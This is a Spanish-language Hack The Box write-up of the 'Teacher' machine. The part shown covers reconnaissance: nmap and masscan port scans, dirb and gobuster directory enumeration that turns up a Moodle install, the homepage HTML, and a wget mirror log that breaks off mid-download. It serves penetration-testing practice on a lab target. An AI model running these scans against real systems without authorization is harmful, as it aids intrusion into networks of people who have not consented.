---
title: "HTB write-up: Teacher"
date: 2019-04-20T18:48:57-05:00
description: "AAAA"
tags: ["hackthebox", "htb", "boot2root", "pentesting", "sudoers", "RCE"]
categories: ["htb", "pentesting"]

---

AAAA

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![teacher image](https://www.hackthebox.eu/storage/avatars/7a34de62dde0bf66d0c89eb0c4d9136b_thumb.png) [teacher](https://www.hackthebox.eu/home/machines/profile/165) | [Gioo](https://www.hackthebox.eu/home/users/profile/623) | Linux | 10.10.10.153 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-teacher/cardinfo.png)

# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

```text
root@laptop:~# nmap -sS -p- --open -v -n 10.10.10.153
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 13:03 CST
Initiating Ping Scan at 13:03
Scanning 10.10.10.153 [4 ports]
Completed Ping Scan at 13:03, 0.42s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:03
Scanning 10.10.10.153 [65535 ports]
Discovered open port 80/tcp on 10.10.10.153
SYN Stealth Scan Timing: About 41.88% done; ETC: 13:05 (0:00:43 remaining)
Completed SYN Stealth Scan at 13:05, 92.27s elapsed (65535 total ports)
Nmap scan report for 10.10.10.153
Host is up (0.20s latency).
Not shown: 64287 closed ports, 1247 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 92.83 seconds
           Raw packets sent: 122545 (5.392MB) | Rcvd: 109495 (4.380MB)
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Continuemos validando los puertos TCP abiertos con masscan:

```text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.153

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-15 06:03:50 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 80/tcp on 10.10.10.153
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios usando nuevamente `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV):

```text
root@laptop:~# nmap -p80 --open -v -n 10.10.10.153 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 13:10 CST
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
Initiating Ping Scan at 13:10
Scanning 10.10.10.153 [4 ports]
Completed Ping Scan at 13:10, 0.42s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:10
Scanning 10.10.10.153 [1 port]
Discovered open port 80/tcp on 10.10.10.153
Completed SYN Stealth Scan at 13:10, 0.42s elapsed (1 total ports)
Initiating Service scan at 13:10
Scanning 1 service on 10.10.10.153
Completed Service scan at 13:10, 6.40s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.153.
Initiating NSE at 13:10
Completed NSE at 13:10, 3.64s elapsed
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
Nmap scan report for 10.10.10.153
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool

NSE: Script Post-scanning.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.52 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p80` para unicamente los puertos TCP/22, TCP/80 y TCP/443
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Reconocemos el servicio del servidor `Apache 2.4.25` sobre el puerto TCP/80. Continuemos por identificar la aplicación sobre este servicio.

# Files and Folders

Ejecutando `dirb` para reconocer el servicio tenemos lo siguiente:

```text
xbytemx@laptop:~/htb/teacher$ dirb http://10.10.10.153/ -o dirb.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.txt
START_TIME: Tue Jan 15 00:36:15 2019
URL_BASE: http://10.10.10.153/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.153/ ----
==> DIRECTORY: http://10.10.10.153/css/
==> DIRECTORY: http://10.10.10.153/fonts/
==> DIRECTORY: http://10.10.10.153/images/
+ http://10.10.10.153/index.html (CODE:200|SIZE:8028)
==> DIRECTORY: http://10.10.10.153/javascript/
==> DIRECTORY: http://10.10.10.153/js/
==> DIRECTORY: http://10.10.10.153/manual/
==> DIRECTORY: http://10.10.10.153/moodle/
+ http://10.10.10.153/phpmyadmin (CODE:403|SIZE:297)
+ http://10.10.10.153/server-status (CODE:403|SIZE:300)

---- Entering directory: http://10.10.10.153/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.153/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.153/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.153/javascript/ ----
==> DIRECTORY: http://10.10.10.153/javascript/jquery/

---- Entering directory: http://10.10.10.153/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.153/manual/ ----
==> DIRECTORY: http://10.10.10.153/manual/da/
==> DIRECTORY: http://10.10.10.153/manual/de/
==> DIRECTORY: http://10.10.10.153/manual/en/
==> DIRECTORY: http://10.10.10.153/manual/es/
==> DIRECTORY: http://10.10.10.153/manual/fr/
==> DIRECTORY: http://10.10.10.153/manual/images/
+ http://10.10.10.153/manual/index.html (CODE:200|SIZE:626)
==> DIRECTORY: http://10.10.10.153/manual/ja/
==> DIRECTORY: http://10.10.10.153/manual/ko/
==> DIRECTORY: http://10.10.10.153/manual/style/
==> DIRECTORY: http://10.10.10.153/manual/tr/
==> DIRECTORY: http://10.10.10.153/manual/zh-cn/

---- Entering directory: http://10.10.10.153/moodle/ ----
==> DIRECTORY: http://10.10.10.153/moodle/admin/
==> DIRECTORY: http://10.10.10.153/moodle/analytics/
==> DIRECTORY: http://10.10.10.153/moodle/auth/
==> DIRECTORY: http://10.10.10.153/moodle/backup/
==> DIRECTORY: http://10.10.10.153/moodle/blocks/
==> DIRECTORY: http://10.10.10.153/moodle/blog/
==> DIRECTORY: http://10.10.10.153/moodle/cache/
==> DIRECTORY: http://10.10.10.153/moodle/calendar/
==> DIRECTORY: http://10.10.10.153/moodle/comment/
==> DIRECTORY: http://10.10.10.153/moodle/course/
==> DIRECTORY: http://10.10.10.153/moodle/error/
==> DIRECTORY: http://10.10.10.153/moodle/files/
==> DIRECTORY: http://10.10.10.153/moodle/filter/
==> DIRECTORY: http://10.10.10.153/moodle/group/
+ http://10.10.10.153/moodle/index.php (CODE:200|SIZE:27288)
==> DIRECTORY: http://10.10.10.153/moodle/install/
==> DIRECTORY: http://10.10.10.153/moodle/lang/
==> DIRECTORY: http://10.10.10.153/moodle/lib/
==> DIRECTORY: http://10.10.10.153/moodle/local/
==> DIRECTORY: http://10.10.10.153/moodle/login/
==> DIRECTORY: http://10.10.10.153/moodle/media/
==> DIRECTORY: http://10.10.10.153/moodle/message/
==> DIRECTORY: http://10.10.10.153/moodle/mod/
==> DIRECTORY: http://10.10.10.153/moodle/my/
==> DIRECTORY: http://10.10.10.153/moodle/notes/
==> DIRECTORY: http://10.10.10.153/moodle/pix/
==> DIRECTORY: http://10.10.10.153/moodle/portfolio/
==> DIRECTORY: http://10.10.10.153/moodle/question/
==> DIRECTORY: http://10.10.10.153/moodle/rating/
==> DIRECTORY: http://10.10.10.153/moodle/report/
==> DIRECTORY: http://10.10.10.153/moodle/repository/
==> DIRECTORY: http://10.10.10.153/moodle/rss/
==> DIRECTORY: http://10.10.10.153/moodle/search/
==> DIRECTORY: http://10.10.10.153/moodle/tag/
==> DIRECTORY: http://10.10.10.153/moodle/theme/
==> DIRECTORY: http://10.10.10.153/moodle/user/
==> DIRECTORY: http://10.10.10.153/moodle/webservice/

---- Entering directory: http://10.10.10.153/javascript/jquery/ ----
+ http://10.10.10.153/javascript/jquery/jquery (CODE:200|SIZE:267180)

---- Entering directory: http://10.10.10.153/manual/da/ ----
==> DIRECTORY: http://10.10.10.153/manual/da/developer/
==> DIRECTORY: http://10.10.10.153/manual/da/faq/
==> DIRECTORY: http://10.10.10.153/manual/da/howto/
+ http://10.10.10.153/manual/da/index.html (CODE:200|SIZE:9117)
==> DIRECTORY: http://10.10.10.153/manual/da/misc/
==> DIRECTORY: http://10.10.10.153/manual/da/mod/
==> DIRECTORY: http://10.10.10.153/manual/da/programs/
==> DIRECTORY: http://10.10.10.153/manual/da/ssl/

---- Entering directory: http://10.10.10.153/manual/de/ ----
==> DIRECTORY: http://10.10.10.153/manual/de/developer/
==> DIRECTORY: http://10.10.10.153/manual/de/faq/
==> DIRECTORY: http://10.10.10.153/manual/de/howto/
+ http://10.10.10.153/manual/de/index.html (CODE:200|SIZE:9544)
==> DIRECTORY: http://10.10.10.153/manual/de/misc/
==> DIRECTORY: http://10.10.10.153/manual/de/mod/
==> DIRECTORY: http://10.10.10.153/manual/de/programs/
==> DIRECTORY: http://10.10.10.153/manual/de/ssl/

---- Entering directory: http://10.10.10.153/manual/en/ ----
==> DIRECTORY: http://10.10.10.153/manual/en/developer/
==> DIRECTORY: http://10.10.10.153/manual/en/faq/
==> DIRECTORY: http://10.10.10.153/manual/en/howto/
+ http://10.10.10.153/manual/en/index.html (CODE:200|SIZE:9352)
==> DIRECTORY: http://10.10.10.153/manual/en/misc/
==> DIRECTORY: http://10.10.10.153/manual/en/mod/
==> DIRECTORY: http://10.10.10.153/manual/en/programs/
==> DIRECTORY: http://10.10.10.153/manual/en/ssl/

(!) FATAL: Too many errors connecting to host
    (Possible cause: COULDNT CONNECT)

-----------------
END_TIME: Tue Jan 15 02:30:48 2019
DOWNLOADED: 36455 - FOUND: 9
```

Así que una de las aplicaciones sobre el servidor Apache es moodle. Tiene sentido, cuando pensamos en el nombre de la maquina.

Para validar algunas otras carpetas y archivos, ejecute un `gobuster`:

```text
xbytemx@laptop:~/htb/teacher$ ~/tools/gobuster -u http://10.10.10.153/ -w ~/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt -s '200,204,301,302,307,403,500' -t 20 -x php,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.153/
[+] Threads      : 20
[+] Wordlist     : /home/xbytemx/git/payloads/owasp/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403,500
[+] Extensions   : php,txt
[+] Timeout      : 10s
=====================================================
2019/01/15 11:26:39 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/moodle (Status: 301)
=====================================================
2019/01/15 12:15:25 Finished
=====================================================
```

# Exploring BlackHatUni

En el root del servidor tenemos:

```html
xbytemx@laptop:~/htb/teacher$ http http://10.10.10.153/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 2133
Content-Type: text/html
Date: Sun, 15 Jan 2019 01:22:53 GMT
ETag: "1f5c-56f96b7bed26f-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Wed, 27 Jun 2018 02:53:22 GMT
Server: Apache/2.4.25 (Debian)
Vary: Accept-Encoding

<!DOCTYPE html>
<!--[if IE 8]> <html class="ie8 oldie" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en"> <!--<![endif]-->
<head>
	<meta charset="utf-8">
	<title>Blackhat highschool</title>
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
	<link rel="stylesheet" media="all" href="css/style.css">
	<!--[if lt IE 9]>
		<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>
<body>

	<header id="header">
		<div class="container">
			<div class="menu-trigger"></div>
			<nav id="menu">
				<ul>
					<li><a href="#">Courses</a></li>
					<li><a href="gallery.html">Students</a></li>
					<li><a href="#">Events</a></li>
 				</ul>
				<ul>
					<li><a href="gallery.html">Teachers</a></li>

					<li><a href="gallery.html">Gallery</a></li>
   				</ul>
			</nav>
			<!-- / navigation -->
		</div>
		<!-- / container -->

	</header>
	<!-- / header -->

	<div class="slider">
		<ul class="bxslider">
			<li>
				<div class="container">
					<div class="info">
						<h2>Itâs Time to <br><span>Get back to school</span></h2>
						<a href="#">Check out our new programs</a>
					</div>
				</div>
				<!-- / content -->
			</li>
			<li>
				<div class="container">
					<div class="info">
						<h2>Itâs Time to <br><span>Get back to school</span></h2>
						<a href="#">Check out our new programs</a>
					</div>
				</div>
				<!-- / content -->
			</li>
			<li>
				<div class="container">
					<div class="info">
						<h2>Itâs Time to <br><span>Get back to school</span></h2>
						<a href="#">Check out our new programs</a>
					</div>
				</div>
				<!-- / content -->
			</li>
		</ul>
		<div class="bg-bottom"></div>
	</div>

	<section class="posts">
		<div class="container">
			<article>
				<div class="pic"><img width="121" src="images/2.png" alt=""></div>
				<div class="info">
					<h3>New portal</h3>
					<p>
					Since today we have a new portal. With this portal students are able to submit their homework, and teachers are able to see them.
					 </p>
				</div>
			</article>
			<article>
				<div class="pic"><img width="121" src="images/3.png" alt=""></div>
				<div class="info">
					<h3>Awesome results of our students</h3>
					<p>Vero eos et accusamus et iusto odio dignissimos ducimus blanditiis praesentium voluptatum deleniti atque corrupti quos dolores et quas molestias excepturi sint occaecati cupiditate non provident, similique sunt in culpa.</p>
				</div>
			</article>
		</div>
		<!-- / container -->
	</section>

	<section class="news">
		<div class="container">
			<h2>Latest news</h2>
			<article>
				<div class="pic"><img src="images/1.png" alt=""></div>
				<div class="info">
					<h4>Omnis iste natus error sit voluptatem accusantium </h4>
					<p class="date">14 APR 2014, Jason Bang</p>
					<p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores (...)</p>
					<a class="more" href="#">Read more</a>
				</div>
			</article>
			<article>
				<div class="pic"><img src="images/1_1.png" alt=""></div>
				<div class="info">
					<h4>Omnis iste natus error sit voluptatem accusantium </h4>
					<p class="date">14 APR 2014, Jason Bang</p>
					<p>Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores (...)</p>
					<a class="more" href="#">Read more</a>
				</div>
			</article>
			<div class="btn-holder">
				<a class="btn" href="#">See archival news</a>
			</div>
		</div>
		<!-- / container -->
	</section>

	<section class="events">
		<div class="container">
			<h2>Upcoming events</h2>
			<article>
				<div class="current-date">
					<p>April</p>
					<p class="date">15</p>
				</div>
				<div class="info">
					<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.</p>
					<a class="more" href="#">Read more</a>
				</div>
			</article>
			<article>
				<div class="current-date">
					<p>April</p>
					<p class="date">17</p>
				</div>
				<div class="info">
					<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.</p>
					<a class="more" href="#">Read more</a>
				</div>
			</article>
			<article>
				<div class="current-date">
					<p>April</p>
					<p class="date">25</p>
				</div>
				<div class="info">
					<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam.</p>
					<a class="more" href="#">Read more</a>
				</div>
			</article>
			<article>
				<div class="current-date">
					<p>April</p>
					<p class="date">29</p>
				</div>
				<div class="info">
					<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad.</p>
					<a class="more" href="#">Read more</a>
				</div>
			</article>
			<div class="btn-holder">
				<a class="btn blue" href="#">See all upcoming events</a>
			</div>
		</div>
		<!-- / container -->
	</section>
	<div class="container">
		<a href="#fancy" class="info-request">
			<span class="holder">
				<span class="title">Request information</span>
				<span class="text">Do you have some questions? Fill the form and get an answer!</span>
			</span>
			<span class="arrow"></span>
		</a>
	</div>

	<footer id="footer">
		<div class="container">
			<section>
				<article class="col-1">
					<h3>Contact</h3>
					<ul>
						<li class="address"><a href="#"><br></a></li>
						<li class="mail"><a href="#">contact@blackhatuni.com</a></li>
						<li class="phone last"><a href="#"></a></li>
					</ul>
				</article>
				<article class="col-2">
					<h3>Forum topics</h3>
					<ul>
						<li><a href="#">Omnis iste natus error sit</a></li>
						<li><a href="#">Nam libero tempore cum soluta</a></li>
						<li><a href="#">Totam rem aperiam eaque </a></li>
						<li><a href="#">Ipsa quae ab illo inventore veritatis </a></li>
						<li class="last"><a href="#">Architecto beatae vitae dicta sunt </a></li>
					</ul>
				</article>
				<article class="col-3">
					<h3>Social media</h3>
					<p>Temporibus autem quibusdam et aut debitis aut rerum necessitatibus saepe.</p>
					<ul>
						<li class="facebook"><a href="#">Facebook</a></li>
						<li class="google-plus"><a href="#">Google+</a></li>
						<li class="twitter"><a href="#">Twitter</a></li>
						<li class="pinterest"><a href="#">Pinterest</a></li>
					</ul>
				</article>
				<article class="col-4">
					<h3>Newsletter</h3>
					<p>Assumenda est omnis dolor repellendus temporibus autem quibusdam.</p>
					<form action="#">
						<input placeholder="Email address..." type="text">
						<button type="submit">Subscribe</button>
					</form>
					<ul>
						<li><a href="#"></a></li>
					</ul>
				</article>
			</section>
		</div>
		<!-- / container -->
	</footer>
	<!-- / footer -->

	<div id="fancy">
		<h2>Request information</h2>
		<form action="#">
			<div class="left">
				<fieldset class="mail"><input placeholder="Email address..." type="text"></fieldset>
				<fieldset class="name"><input placeholder="Name..." type="text"></fieldset>
				<fieldset class="subject"><select><option>Choose subject...</option><option>Choose subject...</option><option>Choose subject...</option></select></fieldset>
			</div>
			<div class="right">
				<fieldset class="question"><textarea placeholder="Question..."></textarea></fieldset>
			</div>
			<div class="btn-holder">
				<button class="btn blue" type="submit">Send request</button>
			</div>
		</form>
	</div>

	<script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
	<script>window.jQuery || document.write("<script src='js/jquery-1.11.1.min.js'>\x3C/script>")</script>
	<script src="js/plugins.js"></script>
	<script src="js/main.js"></script>
</body>
</html>
```

Después de explorar un rato la pagina, decidí hacer un mirror:

```text
xbytemx@laptop:~/htb/teacher$ wget --mirror http://10.10.10.153
--2019-01-15 20:26:22--  http://10.10.10.153/
Conectando con 10.10.10.153:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 8028 (7.8K) [text/html]
Grabando a: “10.10.10.153/index.html”

10.10.10.153/index.html                         100%[=====================================================================================================>]   7.84K  --.-KB/s    en 0.004s

2019-01-15 20:26:22 (1.92 MB/s) - “10.10.10.153/index.html” guardado [8028/8028]

Cargando robots.txt; por favor ignore los errores.
--2019-01-15 20:26:22--  http://10.10.10.153/robots.txt
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 404 Not Found
2019-01-15 20:26:22 ERROR 404: Not Found.

--2019-01-15 20:26:22--  http://10.10.10.153/css/style.css
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 34653 (34K) [text/css]
Grabando a: “10.10.10.153/css/style.css”

10.10.10.153/css/style.css                      100%[=====================================================================================================>]  33.84K  --.-KB/s    en 0.1s

2019-01-15 20:26:22 (275 KB/s) - “10.10.10.153/css/style.css” guardado [34653/34653]

--2019-01-15 20:26:22--  http://10.10.10.153/gallery.html
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 8254 (8.1K) [text/html]
Grabando a: “10.10.10.153/gallery.html”

10.10.10.153/gallery.html                       100%[=====================================================================================================>]   8.06K  --.-KB/s    en 0.004s

2019-01-15 20:26:22 (1.80 MB/s) - “10.10.10.153/gallery.html” guardado [8254/8254]

--2019-01-15 20:26:22--  http://10.10.10.153/images/2.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 7084 (6.9K) [image/png]
Grabando a: “10.10.10.153/images/2.png”

10.10.10.153/images/2.png                       100%[=====================================================================================================>]   6.92K  --.-KB/s    en 0.007s

2019-01-15 20:26:23 (1008 KB/s) - “10.10.10.153/images/2.png” guardado [7084/7084]

--2019-01-15 20:26:23--  http://10.10.10.153/images/3.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 9561 (9.3K) [image/png]
Grabando a: “10.10.10.153/images/3.png”

10.10.10.153/images/3.png                       100%[=====================================================================================================>]   9.34K  --.-KB/s    en 0.004s

2019-01-15 20:26:23 (2.18 MB/s) - “10.10.10.153/images/3.png” guardado [9561/9561]

--2019-01-15 20:26:23--  http://10.10.10.153/images/1.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5126 (5.0K) [image/png]
Grabando a: “10.10.10.153/images/1.png”

10.10.10.153/images/1.png                       100%[=====================================================================================================>]   5.01K  --.-KB/s    en 0.004s

2019-01-15 20:26:23 (1.33 MB/s) - “10.10.10.153/images/1.png” guardado [5126/5126]

--2019-01-15 20:26:23--  http://10.10.10.153/images/1_1.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 4825 (4.7K) [image/png]
Grabando a: “10.10.10.153/images/1_1.png”

10.10.10.153/images/1_1.png                     100%[=====================================================================================================>]   4.71K  --.-KB/s    en 0.004s

2019-01-15 20:26:23 (1.30 MB/s) - “10.10.10.153/images/1_1.png” guardado [4825/4825]

--2019-01-15 20:26:23--  http://10.10.10.153/js/jquery-1.11.1.min.js
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 95785 (94K) [application/javascript]
Grabando a: “10.10.10.153/js/jquery-1.11.1.min.js”

10.10.10.153/js/jquery-1.11.1.min.js            100%[=====================================================================================================>]  93.54K   604KB/s    en 0.2s

2019-01-15 20:26:23 (604 KB/s) - “10.10.10.153/js/jquery-1.11.1.min.js” guardado [95785/95785]

--2019-01-15 20:26:23--  http://10.10.10.153/js/plugins.js
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 44945 (44K) [application/javascript]
Grabando a: “10.10.10.153/js/plugins.js”

10.10.10.153/js/plugins.js                      100%[=====================================================================================================>]  43.89K  --.-KB/s    en 0.03s

2019-01-15 20:26:23 (1.69 MB/s) - “10.10.10.153/js/plugins.js” guardado [44945/44945]

--2019-01-15 20:26:23--  http://10.10.10.153/js/main.js
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3107 (3.0K) [application/javascript]
Grabando a: “10.10.10.153/js/main.js”

10.10.10.153/js/main.js                         100%[=====================================================================================================>]   3.03K  --.-KB/s    en 0.001s

2019-01-15 20:26:23 (2.27 MB/s) - “10.10.10.153/js/main.js” guardado [3107/3107]

--2019-01-15 20:26:23--  http://10.10.10.153/images/logo.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 4269 (4.2K) [image/png]
Grabando a: “10.10.10.153/images/logo.png”

10.10.10.153/images/logo.png                    100%[=====================================================================================================>]   4.17K  --.-KB/s    en 0.004s

2019-01-15 20:26:24 (948 KB/s) - “10.10.10.153/images/logo.png” guardado [4269/4269]

--2019-01-15 20:26:24--  http://10.10.10.153/images/bg_white_arrow.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 808 [image/png]
Grabando a: “10.10.10.153/images/bg_white_arrow.png”

10.10.10.153/images/bg_white_arrow.png          100%[=====================================================================================================>]     808  --.-KB/s    en 0s

2019-01-15 20:26:24 (102 MB/s) - “10.10.10.153/images/bg_white_arrow.png” guardado [808/808]

--2019-01-15 20:26:24--  http://10.10.10.153/images/bg_white.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1095 (1.1K) [image/png]
Grabando a: “10.10.10.153/images/bg_white.png”

10.10.10.153/images/bg_white.png                100%[=====================================================================================================>]   1.07K  --.-KB/s    en 0.001s

2019-01-15 20:26:24 (836 KB/s) - “10.10.10.153/images/bg_white.png” guardado [1095/1095]

--2019-01-15 20:26:24--  http://10.10.10.153/images/bg_slider_nav_2.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 578 [image/png]
Grabando a: “10.10.10.153/images/bg_slider_nav_2.png”

10.10.10.153/images/bg_slider_nav_2.png         100%[=====================================================================================================>]     578  --.-KB/s    en 0s

2019-01-15 20:26:24 (46.5 MB/s) - “10.10.10.153/images/bg_slider_nav_2.png” guardado [578/578]

--2019-01-15 20:26:24--  http://10.10.10.153/images/ico_time.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 460 [image/png]
Grabando a: “10.10.10.153/images/ico_time.png”

10.10.10.153/images/ico_time.png                100%[=====================================================================================================>]     460  --.-KB/s    en 0s

2019-01-15 20:26:24 (49.4 MB/s) - “10.10.10.153/images/ico_time.png” guardado [460/460]

--2019-01-15 20:26:24--  http://10.10.10.153/images/ico_place.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 389 [image/png]
Grabando a: “10.10.10.153/images/ico_place.png”

10.10.10.153/images/ico_place.png               100%[=====================================================================================================>]     389  --.-KB/s    en 0s

2019-01-15 20:26:24 (21.8 MB/s) - “10.10.10.153/images/ico_place.png” guardado [389/389]

--2019-01-15 20:26:24--  http://10.10.10.153/images/bg_arrow_nav.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 287 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow_nav.png”

10.10.10.153/images/bg_arrow_nav.png            100%[=====================================================================================================>]     287  --.-KB/s    en 0s

2019-01-15 20:26:24 (30.3 MB/s) - “10.10.10.153/images/bg_arrow_nav.png” guardado [287/287]

--2019-01-15 20:26:24--  http://10.10.10.153/images/ico_time_2.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 461 [image/png]
Grabando a: “10.10.10.153/images/ico_time_2.png”

10.10.10.153/images/ico_time_2.png              100%[=====================================================================================================>]     461  --.-KB/s    en 0s

2019-01-15 20:26:24 (50.6 MB/s) - “10.10.10.153/images/ico_time_2.png” guardado [461/461]

--2019-01-15 20:26:24--  http://10.10.10.153/images/ico_place_2.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 385 [image/png]
Grabando a: “10.10.10.153/images/ico_place_2.png”

10.10.10.153/images/ico_place_2.png             100%[=====================================================================================================>]     385  --.-KB/s    en 0s

2019-01-15 20:26:24 (41.6 MB/s) - “10.10.10.153/images/ico_place_2.png” guardado [385/385]

--2019-01-15 20:26:24--  http://10.10.10.153/images/pic_slide.jpg
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 66065 (65K) [image/jpeg]
Grabando a: “10.10.10.153/images/pic_slide.jpg”

10.10.10.153/images/pic_slide.jpg               100%[=====================================================================================================>]  64.52K  --.-KB/s    en 0.03s

2019-01-15 20:26:25 (1.99 MB/s) - “10.10.10.153/images/pic_slide.jpg” guardado [66065/66065]

--2019-01-15 20:26:25--  http://10.10.10.153/images/bg_arrow.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 232 [image/png]
Grabando a: “10.10.10.153/images/bg_arrow.png”

10.10.10.153/images/bg_arrow.png                100%[=====================================================================================================>]     232  --.-KB/s    en 0s

2019-01-15 20:26:25 (20.4 MB/s) - “10.10.10.153/images/bg_arrow.png” guardado [232/232]

--2019-01-15 20:26:25--  http://10.10.10.153/images/bg_slider_nav.png
Reutilizando la conexión con 10.10.10.153:80.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 358 [image/png]
Grabando a: “10.10.10.153/images/bg_slider_nav.png”

